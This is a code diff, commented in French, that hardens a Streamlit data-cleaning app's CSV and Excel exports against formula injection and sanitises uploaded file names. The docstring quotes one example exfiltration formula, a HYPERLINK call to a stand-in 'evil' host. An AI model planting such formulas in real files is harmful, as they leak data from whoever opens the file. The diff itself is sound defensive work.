@@ -28,6 +28,25 @@ OPENROUTER_FREE_MODELS = [
 DATE_KEYWORDS = ["date", "time", "jour", "mois", "annee", "année", "year"]
 DECIMAL_PATTERN = re.compile(r"^-?\d+,\d+$")
 LEADING_ZERO_PATTERN = re.compile(r"^0\d")
+FORMULA_PREFIX_CHARS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def neutralize_formulas(df: pd.DataFrame) -> pd.DataFrame:
+    """Empêche l'injection de formule CSV/Excel (CWE-1236).
+
+    Les fichiers CSV/XLSX exportés reproduisent tel quel le contenu du CSV
+    téléversé (non fiable). Une cellule texte commençant par =, +, -, @, tab
+    ou retour chariot est interprétée comme une formule par Excel/LibreOffice
+    à l'ouverture — ex. `=HYPERLINK("http://evil/"&A1)` peut exfiltrer des
+    données dès l'ouverture du fichier. On préfixe ces valeurs d'une apostrophe,
+    convention standard qui force leur traitement en texte.
+    """
+    df = df.copy()
+    for col in df.select_dtypes(include=["object", "str"]).columns:
+        df[col] = df[col].map(
+            lambda v: f"'{v}" if isinstance(v, str) and v.startswith(FORMULA_PREFIX_CHARS) else v
+        )
+    return df
 
 
 def read_csv_robust(uploaded_file) -> tuple[pd.DataFrame, str]:
@@ -170,7 +189,7 @@ def build_excel_report(files: list, query: str, model_used: str, analysis_text: 
 
     for name, df in files:
         ws = wb.create_sheet(sanitize_sheet_name(name, used_names))
-        for row in dataframe_to_rows(df, index=False, header=True):
+        for row in dataframe_to_rows(neutralize_formulas(df), index=False, header=True):
             ws.append(row)
         for cell in ws[1]:
             cell.font = Font(bold=True)
@@ -197,7 +216,7 @@ def build_csv_export(files: list) -> tuple[bytes, str, str]:
     """Exporte les données nettoyées : un CSV seul, ou un ZIP si plusieurs fichiers."""
     if len(files) == 1:
         name, df = files[0]
-        return df.to_csv(index=False).encode("utf-8-sig"), "donnees_nettoyees.csv", "text/csv"
+        return neutralize_formulas(df).to_csv(index=False).encode("utf-8-sig"), "donnees_nettoyees.csv", "text/csv"
 
     buf = io.BytesIO()
     used_names = set()
@@ -210,7 +229,7 @@ def build_csv_export(files: list) -> tuple[bytes, str, str]:
                 csv_name = f"{base}_nettoye_{i}.csv"
                 i += 1
             used_names.add(csv_name.lower())
-            zf.writestr(csv_name, df.to_csv(index=False))
+            zf.writestr(csv_name, neutralize_formulas(df).to_csv(index=False))
     return buf.getvalue(), "donnees_nettoyees.zip", "application/zip"
 
 
@@ -306,7 +325,11 @@ with col2:
                     st.error(f"Impossible de lire ce fichier : {e}")
                     continue
 
-                cleaned_files.append((file.name, df))
+                # os.path.basename en défense en profondeur : le nom de fichier
+                # atterrit ensuite dans des noms d'onglet Excel / d'entrée ZIP,
+                # on évite qu'un séparateur de chemin s'y retrouve.
+                safe_name = os.path.basename(file.name)
+                cleaned_files.append((safe_name, df))
                 file_describe = df.describe()
                 describe_list.append(file_describe)
 
